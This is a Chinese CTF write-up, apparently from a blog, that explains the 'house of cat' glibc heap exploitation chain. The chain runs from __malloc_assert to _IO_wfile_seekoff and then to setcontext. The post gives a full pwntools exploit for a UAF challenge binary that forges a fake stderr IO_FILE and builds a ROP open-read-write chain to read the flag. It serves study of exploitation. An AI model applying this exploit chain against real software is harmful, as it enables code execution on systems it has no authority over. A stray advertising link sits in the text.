
## house\_of\_cat


### **前言：**


**house of cat 这个利用手法和前面提到的 house of kiwi ，和 house of emma 利用的手法是一个链子，当程序无法通过main函数返回时候，或者程序不能显性调用exit函数的时候，我们可以通过 \_\_malloc\_assert 来刷新IO流，当然这个函数在2\.35之后移除了刷新IO流，最后在2\.37彻底移除。**


**house of cat 和 house of emma 一样修改 vtable表，但是不同的是，house of emma 使用的函数是 **\_IO\_cookie\_read来进行跳转，而hosue of cat使用的是\_IO\_wfile\_seekoff来进行函数调用的，这个函数存在 \_IO\_wfile\_jumps中，我们看看它的源码****



```
_IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)
{
  off64_t result;
  off64_t delta, new_offset;
  long int count;

  if (mode == 0)
    return do_ftell_wide (fp);
......

  bool was_writing = ((fp->_wide_data->_IO_write_ptr
		       > fp->_wide_data->_IO_write_base)
		      || _IO_in_put_mode (fp));

  if (was_writing && _IO_switch_to_wget_mode (fp))
    return WEOF;
......
}
```

**发现它会在满足条件的情况下调用 `_IO_switch_to_wget_mode` 函数，我们继续跟进，查看源码**



```
_IO_switch_to_wget_mode (FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
      return EOF;
......
}
```

**它会在满足条件的情况下调用 `_IO_WOVERFLOW`，但是需要满足情况，需要满足`fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base` 这个条件。因为这个 `_IO_WOVERFLOW` 函数是通过 `_wide_data->_wide_vtable` 中所存放的函数指针进行跳转的， 但是`_wide_vtable` 是我们可控的，从而在这里可以劫持程序的执行流。**


**看看完整的调用链\_\_malloc\_assert\-\> \_\_fxprintf\-\>\_\_vfxprintf\-\>locked\_vfxprintf\-\>\_\_vfprintf\_internal\-\>**\_IO\_wfile\_seekoff\-\>\_IO\_switch\_to\_wget\_mode\-\>setcontext\-\>orw****


**调用我们伪造的vtable**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916123214573-1517685678.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916123214573-1517685678.png)**


**满足条件进行调用`_IO_switch_to_wget_mode` 函数**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916121929297-802638110.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916121929297-802638110.png)**


**继续步入，注意这里rax的变化**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916122037432-374584300.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916122037432-374584300.png)**


**这里已经修改过rax\+0x18处的地址**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916122123089-687869698.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916122123089-687869698.png)**


**继续劫持rdx\+0xa0 和rdx\+0xa8达到劫持程流序到堆块上(如果没有开沙箱可以之间system（"/bin/sh"）拿shell。**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916122244312-223465584.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916122244312-223465584.png)**


### **例题**


**题目链接：链接：https://pan.baidu.com/s/1BIOPCJ\_nVxN1iWy\_m\-yWJg?pwd\=c7qv 提取码：c7qv**


**题目一上来是有检查的，但是我们重心放在house of cat ，这里检查直接给出**


**登录的时候需要输入 LOGIN \| r00t QWB QWXFadmin，在每次堆块操作的时候需要输入CAT \| r00t QWB QWXF$\\xff 来通过检查**


**add函数有大小限制，通过calloc来分配**


[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916124151641-752206528.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916124151641-752206528.png)


**edit函数不能越界，只能使用两次，每次输入0x30字节**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916124352509-1416174327.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916124352509-1416174327.png)**


**free函数存在UAF漏洞**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916124331463-27224002.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916124331463-27224002.png):[veee加速器](https://liuyunzhuge.com)**


**show 函数打印0x30字节数据，没有截断**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916124404206-1462532137.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916124404206-1462532137.png)**


**程序还开了沙箱只能orw，而且read的第一个参数必须是0，那么就是要先要关闭文件描述符0，然后再次使用read**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916131442579-2106156456.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916131442579-2106156456.png)**


 


**那么思路很明显，通过largebin 来一次泄露libc地址和堆块地址，然后两次edit，第一个修改stderr结构体（以为malloc\_assert会调用stderr来输出报错信息），第二次修改top\_chunk来修改size来触发 \_malloc\_assert，那么这里就要注意了伪造结构结构体时候一定要注意布局还有它们之间的调用关系**


**EXP：**



```
from gt import *

con("amd64")

io = process("./houseofcat")
libc = ELF("/home/su/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc-2.35.so")

#gdb.attach(io)
io.sendafter("mew mew mew~~~~~~\n","LOGIN | r00t QWB QWXFadmin")


def add(index,size,msg='\x00'):
    io.sendafter("mew mew mew~~~~~~\n","CAT | r00t QWB QWXF$\xff")
    io.sendlineafter("choice:\n","1")
    io.sendlineafter("cat idx:\n",str(index))
    io.sendlineafter("cat size:\n",str(size))
    io.sendafter("your content:\n",msg)



def free(index):
    io.sendafter("mew mew mew~~~~~~\n","CAT | r00t QWB QWXF$\xff")
    io.sendlineafter("choice:\n","2")
    io.sendlineafter("cat idx:\n",str(index))




def show(index):
    io.sendafter("mew mew mew~~~~~~\n","CAT | r00t QWB QWXF$\xff")
    io.sendlineafter("choice:\n","3")
    io.sendlineafter("cat idx:\n",str(index))



def edit(index,msg):
    io.sendafter("mew mew mew~~~~~~\n","CAT | r00t QWB QWXF$\xff")
    io.sendlineafter("choice:\n","4")
    io.sendlineafter("cat idx:\n",str(index))
    io.sendafter("your content:\n",msg)



add(0,0x420) #0
add(1,0x430) #1
add(2,0x418) #2

free(0)
add(3,0x430) #4
show(0)
io.recvuntil("Context:\n")
libc_base = u64(io.recv(8))-0x21a0d0
suc("libc_base",libc_base)
io.recv(8)
heap_base = u64(io.recv(6).ljust(8,b'\x00')) -0x290
suc("heap_base",heap_base)

setcontext = libc_base + libc.sym["setcontext"]
read = libc_base + libc.sym["read"]
write = libc_base + libc.sym["write"]
pop_rax = libc_base + 0x0000000000045eb0#: pop rax; ret; 
pop_rdi = libc_base + 0x000000000002a3e5#: pop rdi; ret; 
pop_rsi = libc_base + 0x000000000002be51#: pop rsi; ret; 
pop_rdx_r12 = libc_base + 0x000000000011f497#: pop rdx; pop r12; ret; 
lv = libc_base + 0x00000000000562ec#: leave; ret; 
stderr = libc_base + libc.sym['stderr']
close = libc_base + libc.sym["close"]
syscall = libc_base + 0x0000000000091396#: syscall; ret; 
_IO_wfile_jumps = libc_base + 0x2160c0


flag_addr = heap_base + 0xb00 + 0x230
orw = flat(pop_rdi ,0 , close)
orw += flat(pop_rdi,flag_addr,pop_rsi,0,pop_rax,2,syscall)
orw += flat(pop_rdi,0,pop_rsi,heap_base + 0x500,pop_rdx_r12,0x30,0,read)
orw += flat(pop_rdi,1,pop_rsi,heap_base + 0x500,pop_rdx_r12,0x30,0,write)
orw += b'flag\x00\x00\x00\x00' + p64(0xdeadbeef)




fake_io_addr = heap_base + 0xb00

fake_IO_FILE  =p64(0)*6
fake_IO_FILE +=p64(1)+p64(0)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx -----> setcontext + 61 
fake_IO_FILE +=p64(setcontext+0x3d)#_IO_save_end=call addr rax+0x58
fake_IO_FILE  =fake_IO_FILE.ljust(0x58,b'\x00')
fake_IO_FILE +=p64(0)  # _chain
fake_IO_FILE  =fake_IO_FILE.ljust(0x78,b'\x00')
fake_IO_FILE += p64(heap_base+0x200)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90,b'\x00')
fake_IO_FILE +=p64(heap_base+0xb30) #rax1
fake_IO_FILE = fake_IO_FILE.ljust(0xB0,b'\x00')
fake_IO_FILE += p64(0)
fake_IO_FILE = fake_IO_FILE.ljust(0xC8,b'\x00')
fake_IO_FILE += p64(libc_base+0x2160c0+0x10)  # vtable=_IO_wfile_jumps+0x10
fake_IO_FILE += p64(0) *6
fake_IO_FILE += p64(fake_io_addr + 0x40) #rax2+0xe0
fake_IO_FILE += p64(0) * 7 + p64(fake_io_addr + 0x160) + p64(pop_rdi+1) #rdx + 0xa0 , 0xa8
fake_IO_FILE += orw

free(2)
payload = p64(libc_base+0x21a0d0)*2 +p64(heap_base+0x290) + p64(stderr - 0x20) 
add(6,0x418,fake_IO_FILE)
edit(0,payload)
free(6)
add(4,0x430)

#gdb.attach(io)
add(5,0x440) #large
add(7,0x430)
add(8,0x430) #unsort
free(5)
add(9,0x450)
top_chunk = heap_base + 0x28d0 
payload = p64(libc_base+0x21a0e0)*2 +p64(heap_base+0x17a0) + p64(top_chunk+3 - 0x20)
edit(5,payload)
free(8)
#add(10,0x460)
#gdb.attach(io)

io.sendafter("mew mew mew~~~~~~\n","CAT | r00t QWB QWXF$\xff")
io.sendlineafter('plz input your cat choice:\n',str(1))
io.sendlineafter('plz input your cat idx:',str(11))
gdb.attach(io,'b* (_IO_wfile_seekoff)')
#gdb.attach(io)
io.sendlineafter('plz input your cat size:',str(0x450))



io.interactive()
```

**分析一下伪造的IO**



```
fake_io_addr = heap_base + 0xb00

fake_IO_FILE  =p64(0)*6
fake_IO_FILE +=p64(1)+p64(0)  #这里为了绕过检查
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx 这里是rdx
fake_IO_FILE +=p64(setcontext+0x3d)#_IO_save_end=call addr   这里是rax + 0x18的位置
fake_IO_FILE  =fake_IO_FILE.ljust(0x58,b'\x00')
fake_IO_FILE +=p64(0)  # _chain
fake_IO_FILE  =fake_IO_FILE.ljust(0x78,b'\x00')
fake_IO_FILE += p64(heap_base+0x200)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90,b'\x00')
fake_IO_FILE +=p64(heap_base+0xb30) #rax1  0x90位置为第一次的rax （rax+0xa0）
fake_IO_FILE = fake_IO_FILE.ljust(0xB0,b'\x00')
fake_IO_FILE += p64(0)
fake_IO_FILE = fake_IO_FILE.ljust(0xC8,b'\x00')
fake_IO_FILE += p64(libc_base+0x2160c0+0x10)  # vtable=_IO_wfile_jumps+0x10
fake_IO_FILE += p64(0) *6
fake_IO_FILE += p64(fake_io_addr + 0x40) #rax2+0xe0
fake_IO_FILE += p64(0) * 7 + p64(fake_io_addr + 0x160) + p64(pop_rdi+1) #rdx + 0xa0 , 0xa8
fake_IO_FILE += orw
```

**最后执行效果**


**[![](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916133141584-469342274.png)](https://img2024.cnblogs.com/blog/3419447/202409/3419447-20240916133141584-469342274.png)**


 \_\_EOF\_\_

   ![](https://github.com/CH13hh)CH13hh  - **本文链接：** [https://github.com/CH13hh/p/18415836](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
